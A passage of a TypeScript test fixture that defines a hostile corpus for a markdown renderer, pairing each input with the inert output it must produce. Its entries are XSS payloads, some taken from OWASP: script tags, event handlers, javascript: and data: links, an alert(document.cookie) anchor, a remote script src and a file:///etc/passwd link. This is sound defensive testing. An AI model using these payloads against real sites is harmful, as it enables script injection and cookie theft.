// The hostile corpus of the markdown renderer, shared by test/markdown-corpus.test.ts and its model twin
// test/markdown-corpus-model.test.ts (and, later, by the screen pass). Every entry names the model outcome it must reach, the
// visible text it must show (R-08: a render that is empty can never pass), and the activation of every link control it draws.
//
// Sources (R-07), recorded here and in the work package report. Every entry has an origin, and every entry of a FETCHED origin
// carries a `cite` that names the source and the place in it, so a reader can find the payload there:
//   'owasp'       payloads of the OWASP XSS Filter Evasion Cheat Sheet, fetched from the OWASP Cheat Sheet Series repository
//                 (cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.md, commit 557f7dc, 2026-10-07); `cite` is the section and, where
//                 the section has several code blocks, the block;
//   'commonmark'  numbered examples of the CommonMark specification 0.31.2 (spec.commonmark.org/0.31.2/spec.json), the version that
//                 markdown-it 15 targets; `cite` is the example number and its section;
//   'markdown-it' cases of markdown-it 15.0.2's own fixtures (test/fixtures/markdown-it/*.txt at the 15.0.2 tag); `cite` is the
//                 file and the case number (a case is one source block between the dots of the fixture file) and its line;
//   'authored'    written by the implementer or the reviewer WITHOUT a fetched source: the first group (payload classes of the
//                 OWASP list and section headings of the CommonMark specification, written from memory in the first pass, not
//                 fetched) and the reviewer's probes 02, 06, 08 and 11 of review cycle 1;
//   'contract'    the list of contracts/markdown-renderer.md;
//   'shape'       the size and nesting shapes of that list.
// The fetched payloads are the fixtures' own text; what each entry expects of the model (the text it shows, its link controls) was
// read from the real pipeline once and checked by eye against the payload (and, for CommonMark and markdown-it, against the
// expected HTML of the example); the security assertions (nothing outside the allowlists, nothing requested) are generic.
//
// Credential-shaped strings are assembled at run time from fragments and appear in no file.
import { makeLargeMarkdown } from '../../src/contract/bulk.js';
import type { ResolvedBlock, ResolvedInline } from '../../src/logic/markdown/links.js';
import type { MarkdownFallbackReason } from '../../src/logic/markdown/model.js';

export type Origin = 'owasp' | 'commonmark' | 'markdown-it' | 'authored' | 'contract' | 'shape';

/** The origins whose entries are copied from a fetched source and so must carry a `cite`. */
export const FETCHED_ORIGINS: readonly Origin[] = ['owasp', 'commonmark', 'markdown-it'];

/** What one activation of a link control must emit, or nothing at all. */
export type Activation = { artifact: { path: string; kind: string } } | { external: string };

export interface CorpusEntry {
  name: string;
  origin: Origin;
  /** For a fetched origin: the source and the place in it (section, example or case number). */
  cite?: string;
  source: string;
  /** The model result: a document, or the fallback and its reason. */
  outcome: 'ok' | MarkdownFallbackReason;
  /** Substrings that must all appear in the text of the rendered subtree. */
  text?: string[];
  /** Substrings that must NOT appear in it (the disguise did not become text that reads as live). */
  absent?: string[];
  /** One entry per link control (`a[role=link]`) in document order: what activating it emits. */
  controls?: Activation[];
  /** The number of inert links (`span[data-md=inert-link]`). */
  inert?: number;
  /** The wall-time ceiling of the whole pipeline (model, links, render), in ms; the spec number for a large document is 500. */
  ceilingMs?: number;
}

/** The open artifact and the listing every entry is resolved against. */
export const OPEN_PATH = 'docs/index.md';
export const LISTING: ReadonlyMap<string, string> = new Map([
  ['docs/index.md', 'spec'],
  ['docs/b.md', 'spec'],
  ['docs/x.md', 'plan'],
  ['docs/y.md', 'tasks'],
]);

const B: Activation = { artifact: { path: 'docs/b.md', kind: 'spec' } };
const X: Activation = { artifact: { path: 'docs/x.md', kind: 'plan' } };
const Y: Activation = { artifact: { path: 'docs/y.md', kind: 'tasks' } };
const ext = (href: string): Activation => ({ external: href });

export const KIB = 1024;
const LARGE = 256 * KIB;
const SHORT_LINE = 200;

/** `unit` repeated to exactly `chars` characters, in one line. */
function repeated(unit: string, chars: number): string {
  return unit.repeat(Math.ceil(chars / unit.length)).slice(0, chars);
}

/** `unit` repeated to `chars` characters and cut into lines of `width` characters. */
function lines(unit: string, chars: number, width: number): string {
  const flat = repeated(unit, chars);
  const out: string[] = [];
  for (let at = 0; at < flat.length; at += width) out.push(flat.slice(at, at + width));
  return out.join('\n');
}

/**
 * Matched emphasis, strong and strike nested `levels` deep: each opener is preceded by a space and followed by a letter, each
 * closer is preceded by a letter and followed by a space, and the closers come in reverse order, so every pair really nests.
 * On one line when `perLine` is 0 (the single-line shape of a table cell); otherwise cut into lines of `perLine` levels.
 */
function nestedMatched(levels: number, perLine = 0, marks: readonly string[] = ['*', '_', '**', '~~']): string {
  const used = Array.from({ length: levels }, (_, at) => marks[at % marks.length] ?? '*');
  const opens = used.map((mark) => `${mark}a`);
  const closes = [...used].reverse().map((mark) => `a${mark}`);
  if (perLine === 0) return [...opens, 'x', ...closes].join(' ');
  const lines: string[] = [];
  for (let at = 0; at < opens.length; at += perLine) lines.push(opens.slice(at, at + perLine).join(' '));
  lines.push('x');
  for (let at = 0; at < closes.length; at += perLine) lines.push(closes.slice(at, at + perLine).join(' '));
  return lines.join('\n');
}

function nestedQuotes(depth: number): string {
  return `${'> '.repeat(depth)}deep`;
}

function nestedBullets(depth: number): string {
  const rows: string[] = [];
  for (let at = 0; at < depth; at += 1) rows.push(`${'  '.repeat(at)}- level ${at + 1}`);
  return rows.join('\n');
}

/** A table of `cells` cells in 5 columns (header included), one short row per line. */
function tableOfCells(cells: number): string {
  const columns = 5;
  const head = `| ${Array.from({ length: columns }, (_, at) => `h${at}`).join(' | ')} |`;
  const rule = `|${' --- |'.repeat(columns)}`;
  const rows: string[] = [head, rule];
  for (let made = columns; made < cells; made += columns) {
    const width = Math.min(columns, cells - made);
    rows.push(`| ${Array.from({ length: columns }, (_, at) => (at < width ? 'c' : '')).join(' | ')} |`);
  }
  return rows.join('\n');
}

const credential = ['gh', 'p_', 'A1b2C3d4E5f6G7h8I9j0K1l2M3n4O5p6Q7r8'].join('');
const credentialKey = ['AK', 'IA', 'IOSFODNN7EXAMPLE'].join('');

const BS = String.fromCharCode(92);
const ZW = String.fromCharCode(0x200b);
const RLO = String.fromCharCode(0x202e);
const LRI = String.fromCharCode(0x2066);

export const CORPUS: readonly CorpusEntry[] = [
  // --- raw HTML is text (OWASP classes) ---------------------------------------------------------------------------------
  { name: 'script element', origin: 'authored', source: '<script>alert(1)</script>', outcome: 'ok', text: ['<script>alert(1)</script>'] },
  { name: 'script element amid prose', origin: 'authored', source: 'before <script>alert(1)</script> after', outcome: 'ok', text: ['before <script>alert(1)</script> after'] },
  { name: 'img onerror', origin: 'authored', source: '<img src=x onerror=alert(1)>', outcome: 'ok', text: ['<img src=x onerror=alert(1)>'] },
  { name: 'iframe', origin: 'authored', source: '<iframe src="http://example.invalid/"></iframe>', outcome: 'ok', text: ['<iframe src="http://example.invalid/"></iframe>'] },
  { name: 'svg onload', origin: 'authored', source: '<svg onload=alert(1)>', outcome: 'ok', text: ['<svg onload=alert(1)>'] },
  { name: 'anchor with a javascript href', origin: 'authored', source: '<a href="javascript:alert(1)">x</a>', outcome: 'ok', text: ['<a href="javascript:alert(1)">x</a>'] },
  { name: 'style element', origin: 'authored', source: '<style>body{display:none}</style>', outcome: 'ok', text: ['<style>body{display:none}</style>'] },
  { name: 'form with an input', origin: 'authored', source: '<form action="http://example.invalid/"><input name=a></form>', outcome: 'ok', text: ['<form action="http://example.invalid/"><input name=a></form>'] },
  { name: 'base element', origin: 'authored', source: '<base href="http://example.invalid/">', outcome: 'ok', text: ['<base href="http://example.invalid/">'] },
  { name: 'meta refresh', origin: 'authored', source: '<meta http-equiv="refresh" content="0;url=http://example.invalid/">', outcome: 'ok', text: ['<meta http-equiv="refresh"'] },
  { name: 'event handler in mixed case', origin: 'authored', source: '<p OnClIcK=alert(1)>x</p>', outcome: 'ok', text: ['<p OnClIcK=alert(1)>x</p>'] },
  { name: 'event handler on a block element', origin: 'authored', source: '<div onmouseover="alert(1)">hover</div>', outcome: 'ok', text: ['<div onmouseover="alert(1)">hover</div>'] },
  { name: 'details ontoggle', origin: 'authored', source: '<details open ontoggle=alert(1)>x</details>', outcome: 'ok', text: ['<details open ontoggle=alert(1)>x</details>'] },
  { name: 'style attribute with a javascript url', origin: 'authored', source: '<div style="background:url(javascript:alert(1))">x</div>', outcome: 'ok', text: ['background:url(javascript:alert(1))'] },
  { name: 'math with an xlink href', origin: 'authored', source: '<math><mi xlink:href="data:x,<script>alert(1)</script>">x</mi></math>', outcome: 'ok', text: ['<math><mi xlink:href='] },
  { name: 'html comment', origin: 'contract', source: '<!-- a comment -->', outcome: 'ok', text: ['<!-- a comment -->'] },
  { name: 'cdata section', origin: 'contract', source: '<![CDATA[ x ]]>', outcome: 'ok', text: ['<![CDATA[ x ]]>'] },
  { name: 'entities that decode to a tag', origin: 'authored', source: '&lt;script&gt;alert(1)&lt;/script&gt;', outcome: 'ok', text: ['<script>alert(1)</script>'] },
  { name: 'numeric entities that decode to a tag', origin: 'authored', source: '&#60;img src=x onerror=alert(1)&#62;', outcome: 'ok', text: ['<img src=x onerror=alert(1)>'] },
  { name: 'entity-encoded javascript scheme in prose', origin: 'authored', source: '&#106;avascript:alert(1)', outcome: 'ok', text: ['javascript:alert(1)'] },
  { name: 'fence with a hostile info string', origin: 'contract', source: '```"><script>\nbody\n```', outcome: 'ok', text: ['body'], absent: ['script'] },
  { name: 'tilde fence with a hostile info string', origin: 'contract', source: '~~~ onclick=alert(1)\nbody\n~~~', outcome: 'ok', text: ['body'], absent: ['onclick'] },

  // --- link destinations: layer 1 (the parser) turns the blocked schemes into literal text ----------------------------------
  { name: 'javascript link', origin: 'authored', source: '[x](javascript:alert(1))', outcome: 'ok', text: ['[x](javascript:alert(1))'], controls: [], inert: 0 },
  { name: 'javascript link in mixed case', origin: 'authored', source: '[x](JaVaScRiPt:alert(1))', outcome: 'ok', text: ['[x](JaVaScRiPt:alert(1))'], controls: [], inert: 0 },
  { name: 'javascript link with a leading space', origin: 'authored', source: '[x]( javascript:alert(1))', outcome: 'ok', text: ['[x]( javascript:alert(1))'], controls: [], inert: 0 },
  { name: 'javascript link with an entity letter', origin: 'authored', source: '[x](&#106;avascript:alert(1))', outcome: 'ok', text: ['[x](javascript:alert(1))'], controls: [], inert: 0 },
  { name: 'javascript link with a hex entity scheme', origin: 'authored', source: '[x](&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x31&#x29)', outcome: 'ok', text: ['x', 'not a followable link'], controls: [], inert: 1 },
  { name: 'javascript link with an entity colon', origin: 'authored', source: "[x](javascript&colon;alert('x'))", outcome: 'ok', text: ['[x]('], controls: [] },
  { name: 'javascript link with spaces inside the scheme', origin: 'authored', source: '[x](j a v a s c r i p t:alert(1))', outcome: 'ok', text: ['[x](j a v a s c r i p t:alert(1))'], controls: [] },
  { name: 'javascript link reading storage', origin: 'authored', source: '[x](javascript:alert(JSON.stringify(localStorage)))', outcome: 'ok', text: ['[x](javascript:alert('], controls: [] },
  { name: 'javascript link with a window handler', origin: 'authored', source: '[x](javascript:window.onerror=alert;throw%201)', outcome: 'ok', text: ['[x](javascript:window.onerror=alert;throw%201)'], controls: [] },
  { name: 'javascript link with an embedded tab entity', origin: 'contract', source: '[x](java&#9;script:alert(1))', outcome: 'ok', text: ['x'], controls: [], inert: 1 },
  { name: 'javascript link with an embedded newline entity', origin: 'contract', source: '[x](java&#10;script:alert(1))', outcome: 'ok', text: ['x'], controls: [], inert: 1 },
  { name: 'data html link', origin: 'authored', source: '[x](data:text/html,<script>alert(1)</script>)', outcome: 'ok', text: ['[x](data:text/html,'], controls: [] },
  { name: 'data html base64 link', origin: 'authored', source: '[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)', outcome: 'ok', text: ['[x](data:text/html;base64,'], controls: [] },
  { name: 'vbscript link', origin: 'authored', source: '[x](vbscript:msgbox(1))', outcome: 'ok', text: ['[x](vbscript:msgbox(1))'], controls: [] },
  { name: 'file link', origin: 'authored', source: '[x](file:///etc/passwd)', outcome: 'ok', text: ['[x](file:///etc/passwd)'], controls: [] },
  { name: 'javascript reference definition', origin: 'authored', source: '[x][r]\n\n[r]: javascript:alert(1)', outcome: 'ok', text: ['[x][r]'], controls: [] },
  { name: 'javascript autolink', origin: 'authored', source: '<javascript:alert(1)>', outcome: 'ok', text: ['<javascript:alert(1)>'], controls: [] },
  { name: 'javascript image', origin: 'authored', source: '![x](javascript:alert(1))', outcome: 'ok', text: ['![x](javascript:alert(1))'], controls: [] },

  // --- link destinations: layer 2 (classifyLink) ---------------------------------------------------------------------------------
  { name: 'data image link is inert', origin: 'contract', source: '[x](data:image/png;base64,AAAA)', outcome: 'ok', text: ['x', 'not a followable link'], controls: [], inert: 1 },
  { name: 'data image is a plain placeholder', origin: 'contract', source: '![x](data:image/png;base64,AAAA)', outcome: 'ok', text: ['Image', 'x'], controls: [], inert: 0 },
  { name: 'protocol-relative link', origin: 'contract', source: '[x](//host.invalid/path)', outcome: 'ok', text: ['x', 'not a followable link'], controls: [], inert: 1 },
  { name: 'backslash host link', origin: 'contract', source: '[x](\\\\host\\share)', outcome: 'ok', text: ['x'], controls: [] },
  { name: 'link above the root', origin: 'contract', source: '[x](../../../outside.md)', outcome: 'ok', text: ['x', 'not a followable link'], controls: [], inert: 1 },
  { name: 'percent-encoded dot-dot link', origin: 'contract', source: '[x](%2e%2e/outside.md)', outcome: 'ok', text: ['x', 'not a followable link'], controls: [], inert: 1 },
  { name: 'http without a host', origin: 'contract', source: '[x](http://)', outcome: 'ok', text: ['x'], controls: [] },
  { name: 'userinfo spoof', origin: 'authored', source: '[x](http://github.com@evil.invalid/)', outcome: 'ok', text: ['x', 'not a followable link'], controls: [], inert: 1 },
  { name: 'mailto with a query', origin: 'contract', source: '[x](mailto:?bcc=a@example.invalid&body=x)', outcome: 'ok', text: ['x', 'not a followable link'], controls: [], inert: 1 },
  { name: 'mailto', origin: 'contract', source: '[x](mailto:a@example.invalid)', outcome: 'ok', text: ['x', 'opens in your browser'], controls: [ext('mailto:a@example.invalid')], inert: 0 },
  { name: 'http link in upper case', origin: 'contract', source: '[x](HTTP://EXAMPLE.COM/p)', outcome: 'ok', text: ['x', 'opens in your browser'], controls: [ext('HTTP://EXAMPLE.COM/p')] },
  { name: 'https link', origin: 'contract', source: '[x](https://example.com/p?q=1#f)', outcome: 'ok', text: ['x'], controls: [ext('https://example.com/p?q=1#f')] },
  { name: 'relative link to a listed artifact', origin: 'contract', source: '[x](b.md)', outcome: 'ok', text: ['x', 'opens another artifact'], controls: [B] },
  { name: 'relative link with a dot segment, a query and a fragment', origin: 'contract', source: '[x](./b.md?q=1#frag)', outcome: 'ok', text: ['x'], controls: [B] },
  { name: 'relative link to an unlisted path', origin: 'contract', source: '[x](nothing.md)', outcome: 'ok', text: ['x', 'not a followable link'], controls: [], inert: 1 },
  { name: 'root-relative link', origin: 'contract', source: '[x](/abs.md)', outcome: 'ok', text: ['x', 'not a followable link'], controls: [], inert: 1 },
  { name: 'fragment-only link', origin: 'contract', source: '[x](#frag)', outcome: 'ok', text: ['x', 'not a followable link'], controls: [], inert: 1 },
  { name: 'empty destination', origin: 'authored', source: '[x]()', outcome: 'ok', text: ['x'], controls: [] },
  { name: 'destination of 3000 characters', origin: 'contract', source: `[x](https://example.invalid/${'a'.repeat(3000)})`, outcome: 'ok', text: ['x', 'not a followable link'], controls: [], inert: 1 },
  { name: 'reference definition to a listed artifact', origin: 'contract', source: '[x][r]\n\n[r]: b.md "ignored title"', outcome: 'ok', text: ['x'], controls: [B], absent: ['ignored title'] },
  { name: 'footnote-shaped reference', origin: 'contract', source: '[^1]\n\n[^1]: n', outcome: 'ok', text: ['^1'], controls: [], inert: 1 },
  { name: 'attribute breakout in a link destination', origin: 'authored', source: '[x](http://a.invalid/"onclick="alert(1))', outcome: 'ok', text: ['x'], controls: [ext('http://a.invalid/%22onclick=%22alert(1)')] },
  { name: 'attribute breakout in a relative destination', origin: 'authored', source: "[x]('onclick='alert(1))", outcome: 'ok', text: ['x'], controls: [] },
  { name: 'http autolink', origin: 'authored', source: '<http://example.invalid/p>', outcome: 'ok', text: ['http://example.invalid/p'], controls: [ext('http://example.invalid/p')] },
  { name: 'autolink with a quote breakout', origin: 'authored', source: '<http://a.invalid"onmouseover="alert(1)>', outcome: 'ok', text: ['onmouseover'], controls: [ext('http://a.invalid%22onmouseover=%22alert(1)')] },
  { name: 'mailto autolink', origin: 'authored', source: '<mailto:a@example.invalid>', outcome: 'ok', text: ['mailto:a@example.invalid'], controls: [ext('mailto:a@example.invalid')] },
  { name: 'link text equal to its destination', origin: 'contract', source: '[https://example.invalid/p](https://example.invalid/p)', outcome: 'ok', text: ['https://example.invalid/p'], controls: [ext('https://example.invalid/p')] },
  { name: 'autolink inside the text of an artifact link', origin: 'contract', source: '[<https://evil.example/x>](b.md)', outcome: 'ok', text: ['https://evil.example/x'], controls: [B] },
  { name: 'mailto autolink inside the text of an external link', origin: 'contract', source: '[see <mailto:a@b.example>](https://good.example)', outcome: 'ok', text: ['see ', 'mailto:a@b.example'], controls: [ext('https://good.example')] },
  { name: 'two adjacent links', origin: 'contract', source: '[a](b.md)[c](x.md)', outcome: 'ok', text: ['a', 'c'], controls: [B, X] },
  { name: 'link inside emphasis', origin: 'contract', source: '*see [x](b.md) now*', outcome: 'ok', text: ['see ', 'x', ' now'], controls: [B] },
  { name: 'link inside a heading', origin: 'contract', source: '# Heading [x](y.md)', outcome: 'ok', text: ['Heading ', 'x'], controls: [Y] },
  { name: 'links inside table cells', origin: 'contract', source: '| a | b |\n| --- | --- |\n| [x](b.md) | [y](https://example.invalid/) |', outcome: 'ok', text: ['a', 'b', 'x', 'y'], controls: [B, ext('https://example.invalid/')] },

  // --- images are never loaded (alt text and a placeholder) ---------------------------------------------------------------------
  { name: 'remote image', origin: 'contract', source: '![alt words](http://remote.invalid/p.png)', outcome: 'ok', text: ['Image', 'alt words'], controls: [ext('http://remote.invalid/p.png')] },
  { name: 'image with an empty alt', origin: 'contract', source: '![](http://remote.invalid/p.png)', outcome: 'ok', text: ['Image'], controls: [ext('http://remote.invalid/p.png')] },
  { name: 'image to a listed artifact is plain text', origin: 'contract', source: '![pic](b.md)', outcome: 'ok', text: ['Image', 'pic'], controls: [] },
  { name: 'image with a title and a breakout', origin: 'authored', source: '![x](http://remote.invalid/p.png "t\\" onerror=\\"alert(1)")', outcome: 'ok', text: ['Image', 'x'], controls: [ext('http://remote.invalid/p.png')] },
  { name: 'image inside a link to an artifact', origin: 'contract', source: '[![a](http://r.invalid/p.png)](b.md)', outcome: 'ok', text: ['Image', 'a'], controls: [B] },
  { name: 'image inside an external link', origin: 'contract', source: '[![a](http://x.invalid/)](http://y.invalid/)', outcome: 'ok', text: ['Image', 'a'], controls: [ext('http://y.invalid/')] },
  { name: 'artifact image inside an artifact link', origin: 'contract', source: '[![a](x.md)](y.md)', outcome: 'ok', text: ['Image', 'a'], controls: [Y] },
  { name: 'image inside an inert link', origin: 'contract', source: '[![a](http://r.invalid/p.png)](//host.invalid/x)', outcome: 'ok', text: ['Image', 'a', 'not a followable link'], controls: [], inert: 1 },
  { name: 'link inside an image alt', origin: 'contract', source: '![[l](b.md)](http://r.invalid/p.png)', outcome: 'ok', text: ['Image', 'l'], controls: [ext('http://r.invalid/p.png')] },
  { name: 'image inside an image alt', origin: 'contract', source: '![a ![b](http://r.invalid/q.png) c](http://r.invalid/p.png)', outcome: 'ok', text: ['Image', 'a b c'], controls: [ext('http://r.invalid/p.png')] },
  { name: 'long alt text is truncated', origin: 'contract', source: `![${'w'.repeat(2000)}](http://r.invalid/p.png)`, outcome: 'ok', text: ['Image', 'w'.repeat(512)], absent: ['w'.repeat(513)], controls: [ext('http://r.invalid/p.png')] },

  // --- CommonMark structure -------------------------------------------------------------------------------------------------------
  { name: 'tabs as indentation', origin: 'authored', source: '\tfoo\tbaz\t\tbim', outcome: 'ok', text: ['foo\tbaz\t\tbim'] },
  { name: 'thematic breaks', origin: 'authored', source: '***\n---\n___', outcome: 'ok', text: [] },
  { name: 'atx headings, six levels and seven', origin: 'authored', source: '# a\n## b\n### c\n#### d\n##### e\n###### f\n####### g', outcome: 'ok', text: ['a', 'f', '####### g'] },
  { name: 'setext headings', origin: 'authored', source: 'Foo *bar*\n=========\n\nFoo\n---', outcome: 'ok', text: ['Foo ', 'bar'] },
  { name: 'indented code', origin: 'authored', source: '    a simple\n      indented code block', outcome: 'ok', text: ['a simple\n  indented code block'] },
  { name: 'unclosed fence runs to the end', origin: 'authored', source: '```\nunclosed', outcome: 'ok', text: ['unclosed'] },
  { name: 'link reference definitions with a title', origin: 'authored', source: '[foo]: /url "title"\n\n[foo]', outcome: 'ok', text: ['foo'], controls: [] },
  { name: 'block quote with lazy continuation', origin: 'authored', source: '> # Foo\n> bar\nbaz', outcome: 'ok', text: ['Foo', 'bar', 'baz'] },
  { name: 'tight list', origin: 'authored', source: '- a\n- b\n- c', outcome: 'ok', text: ['a', 'b', 'c'] },
  { name: 'loose list with nested content', origin: 'authored', source: '1. a\n\n   para\n\n2. b\n\n   > quote', outcome: 'ok', text: ['a', 'para', 'b', 'quote'] },
  { name: 'ordered list starting at zero', origin: 'authored', source: '0. zero\n1. one', outcome: 'ok', text: ['zero', 'one'] },
  { name: 'ordered list starting past the limit', origin: 'authored', source: '1000000000. big', outcome: 'ok', text: ['1000000000. big'] },
  { name: 'ordered list at the largest start', origin: 'authored', source: '999999999. big', outcome: 'ok', text: ['big'] },
  { name: 'backslash escapes', origin: 'authored', source: '\\*not emphasis\\* \\[not a link\\](b.md) \\<not html\\>', outcome: 'ok', text: ['*not emphasis* [not a link](b.md) <not html>'], controls: [] },
  { name: 'entity references', origin: 'authored', source: '&amp; &copy; &#35; &#x22; &nbsp; &bogus;', outcome: 'ok', text: ['& ', '#', '&bogus;'] },
  { name: 'code spans with backticks', origin: 'authored', source: '`` foo ` bar ``\n\n`<script>`', outcome: 'ok', text: ['foo ` bar', '<script>'] },
  { name: 'emphasis edge cases', origin: 'authored', source: '*foo**bar**baz*\n\nfoo***bar***baz\n\n**foo*bar*baz**\n\n*foo _bar* baz_', outcome: 'ok', text: ['foo', 'bar', 'baz'] },
  { name: 'strikethrough', origin: 'authored', source: '~~gone~~ and ~single~', outcome: 'ok', text: ['gone', 'and '] },
  { name: 'hard breaks, soft breaks and a trailing backslash', origin: 'authored', source: 'a  \nb\nc\\\nd', outcome: 'ok', text: ['a', 'b', 'c', 'd'] },
  { name: 'table with alignment, an escaped pipe and short rows', origin: 'authored', source: '| a | b | c |\n| :--- | :---: | ---: |\n| 1 \\| 2 | x |\n| y |', outcome: 'ok', text: ['a', 'b', 'c', '1 | 2', 'x', 'y'] },
  { name: 'table of one column', origin: 'authored', source: '| h |\n| - |\n| c |', outcome: 'ok', text: ['h', 'c'] },
  { name: 'task-list markers are literal text', origin: 'contract', source: '- [ ] todo\n- [x] done', outcome: 'ok', text: ['[ ] todo', '[x] done'] },
  { name: 'definition-list shape is literal text', origin: 'contract', source: 'Term\n: definition', outcome: 'ok', text: ['Term', ': definition'] },
  { name: 'byte order mark first', origin: 'contract', source: '﻿# Title\n\nbody', outcome: 'ok', text: ['Title', 'body'] },
  { name: 'NUL and the replacement character', origin: 'contract', source: 'a\u0000b � c', outcome: 'ok', text: ['b ', ' c'] },
  { name: 'bidirectional controls', origin: 'contract', source: 'abc ‮def‬ ⁦ghi⁩ ‏jkl', outcome: 'ok', text: ['abc ', 'def', 'ghi', 'jkl'] },
  { name: 'credential-shaped strings are plain text', origin: 'contract', source: `key ${credentialKey}\n\ntoken ${credential}`, outcome: 'ok', text: [credentialKey, credential] },

  // --- fetched sources (R-07): OWASP, CommonMark 0.31.2 and markdown-it 15.0.2, in that order, each entry with its `cite` -------
  { name: 'OWASP Basic XSS Test Without Filter Evasion', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Basic XSS Test Without Filter Evasion"', source: '<SCRIPT SRC=https://example.com/xss-test.js></SCRIPT>', outcome: 'ok', text: ['<SCRIPT SRC=https://example.com/xss-test.js></SC'], controls: [] },
  { name: 'OWASP XSS Locator (Polyglot)', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "XSS Locator (Polyglot)"', source: 'javascript:/*--></title></style></textarea></script></xmp>\n<svg/onload=\'+/"`/+/onmouseover=1/+/[*/[]/+alert(42);//\'>', outcome: 'ok', text: ['javascript:/'], controls: [] },
  { name: 'OWASP Malformed A Tags', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Malformed A Tags", code block 1', source: '\\<a onmouseover="alert(document.cookie)"\\>xxs link\\</a\\>', outcome: 'ok', text: ['<a onmouseover="alert(document.cookie)">xxs link'], controls: [] },
  { name: 'OWASP Malformed A Tags (2)', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Malformed A Tags", code block 2', source: '\\<a onmouseover=alert(document.cookie)\\>xxs link\\</a\\>', outcome: 'ok', text: ['<a onmouseover=alert(document.cookie)>xxs link</'], controls: [] },
  { name: 'OWASP Malformed IMG Tags', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Malformed IMG Tags"', source: '<IMG\u00A0"""><SCRIPT>alert("XSS")</SCRIPT>"\\>', outcome: 'ok', text: ['<IMG\u00A0"""><SCRIPT>alert("XSS")</SCRIPT>">'], controls: [] },
  { name: 'OWASP fromCharCode', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "fromCharCode"', source: '<a href="javascript:alert(String.fromCharCode(88,83,83))">Click Me!</a>', outcome: 'ok', text: ['<a href="javascript:alert(String.fromCharCode(88'], controls: [] },
  { name: 'OWASP Default SRC Tag to Get Past Filters that Check SRC Domain', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Default SRC Tag to Get Past Filters that Check SRC Domain"', source: '<IMG SRC=# onmouseover="alert(\'xxs\')">', outcome: 'ok', text: ['<IMG SRC=# onmouseover="alert(\'xxs\')">'], controls: [] },
  { name: 'OWASP Default SRC Tag by Leaving it Empty', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Default SRC Tag by Leaving it Empty"', source: '<IMG SRC= onmouseover="alert(\'xxs\')">', outcome: 'ok', text: ['<IMG SRC= onmouseover="alert(\'xxs\')">'], controls: [] },
  { name: 'OWASP On Error Alert', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "On Error Alert"', source: '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>', outcome: 'ok', text: ['<IMG SRC=/ onerror="alert(String.fromCharCode(88'], controls: [] },
  { name: 'OWASP IMG onerror and JavaScript Alert Encode', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "IMG onerror and JavaScript Alert Encode"', source: '<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">', outcome: 'ok', text: ['<img src=x onerror="&#0000106&#0000097&#0000118&'], controls: [] },
  { name: 'OWASP Decimal HTML Character References', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Decimal HTML Character References"', source: '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">Click Me!</a>', outcome: 'ok', text: ['<a href="javascript:alert(\'XSS\')">Click Me!</a>'], controls: [] },
  { name: 'OWASP Decimal HTML Character References Without Trailing Semicolons', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Decimal HTML Character References Without Trailing Semicolons"', source: '<a href="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">Click Me</a>', outcome: 'ok', text: ['<a href="&#0000106&#0000097&#0000118&#0000097&#0'], controls: [] },
  { name: 'OWASP Hexadecimal HTML Character References Without Trailing Semicolons', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Hexadecimal HTML Character References Without Trailing Semicolons"', source: '<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29">Click Me</a>', outcome: 'ok', text: ['<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x6'], controls: [] },
  { name: 'OWASP Embedded Tab', origin: 'owasp', cite: 'OWASP Cheat Sheet Series, XSS_Filter_Evasion_Cheat_Sheet.md at commit 557f7dc, section "Embedded Tab"', source: '<a href="jav\tascript:alert(\'XSS\');">Click Me</a>', outcome: 'ok', text: ['<a href="jav'], controls: [] },
